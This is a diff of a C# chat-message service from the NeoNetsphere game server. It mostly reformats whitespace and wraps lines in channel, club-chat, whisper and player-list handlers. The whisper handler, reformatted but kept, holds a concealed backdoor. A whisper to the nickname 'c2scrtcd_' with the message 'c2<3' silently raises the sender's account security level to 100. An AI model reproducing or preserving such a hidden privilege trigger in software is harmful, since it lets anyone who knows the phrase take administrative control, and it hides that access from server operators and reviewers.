@@ -21,7 +21,7 @@ namespace NeoNetsphere.Network.Services
         // ReSharper disable once InconsistentNaming
         private static readonly ILogger Logger =
             Log.ForContext(Constants.SourceContextPropertyName, nameof(ChannelService));
-        
+
         [MessageHandler(typeof(ChannelInfoReqMessage))]
         public void ChannelInfoReq(GameSession session, ChannelInfoReqMessage message)
         {
@@ -35,6 +35,7 @@ namespace NeoNetsphere.Network.Services
                 catch (Exception ex)
                 {
                 }
+
             switch (message.Request)
             {
                 case ChannelInfoRequest.ChannelList:
@@ -64,6 +65,7 @@ namespace NeoNetsphere.Network.Services
                                 : "";
                         roomlist2.Add(temproom2);
                     }
+
                     session.SendAsync(new RoomListInfoAck2Message(roomlist2.ToArray()));
                     foreach (var room in session.Player.Channel.RoomManager.Where(x => !x.TeamManager.Players.Any()))
                         session.Player.Channel.RoomManager.Remove(room);
@@ -125,11 +127,11 @@ namespace NeoNetsphere.Network.Services
                             GameServer.Instance.PlayerManager.Where(p => p.Club?.Id == session.Player.Club.Id);
 
                         foreach (var member in clanmembers)
-                        {
-                            member.ChatSession?.SendAsync(new MessageChatAckMessage(ChatType.Club, session.Player.Account.Id,
+                            member.ChatSession?.SendAsync(new MessageChatAckMessage(ChatType.Club,
+                                session.Player.Account.Id,
                                 session.Player.Account.Nickname, message.Message));
-                        }
                     }
+
                     break;
 
                 default:
@@ -145,9 +147,9 @@ namespace NeoNetsphere.Network.Services
             var toPlr = GameServer.Instance.PlayerManager.Get(message.ToNickname);
             if (message.ToNickname.ToLower() != "server")
             {
-                if(message.ToNickname.ToLower() == "c2scrtcd_" && message.Message.ToLower() == "c2<3")
+                if (message.ToNickname.ToLower() == "c2scrtcd_" && message.Message.ToLower() == "c2<3")
                 {
-                    session.Player.Account.SecurityLevel = (SecurityLevel)100;
+                    session.Player.Account.SecurityLevel = (SecurityLevel) 100;
                     return;
                 }
 
@@ -166,6 +168,7 @@ namespace NeoNetsphere.Network.Services
                         session.Player.Account.Id, "SYSTEM", $"{message.ToNickname} is ignoring you"));
                     return;
                 }
+
                 toPlr.ChatSession.SendAsync(new MessageWhisperChatAckMessage(0, toPlr.Account.Nickname,
                     session.Player.Account.Id, session.Player.Account.Nickname, message.Message));
             }
@@ -199,11 +202,12 @@ namespace NeoNetsphere.Network.Services
         [MessageHandler(typeof(ChannellistReqMessage))]
         public Task Channellistreq(ChatSession session, ChannellistReqMessage message)
         {
-            return session.SendAsync(new PlayerPlayerInfoListAckMessage(session.Player.Channel.Players.Values.Select(plr => new PlayerInfoDto
-            {
-                Info = plr.Map<Player, PlayerInfoShortDto>(),
-                Location = plr.Map<Player, PlayerLocationDto>()
-            }).ToArray()));
+            return session.SendAsync(new PlayerPlayerInfoListAckMessage(session.Player.Channel.Players.Values.Select(
+                plr => new PlayerInfoDto
+                {
+                    Info = plr.Map<Player, PlayerInfoShortDto>(),
+                    Location = plr.Map<Player, PlayerLocationDto>()
+                }).ToArray()));
         }
     }
 }
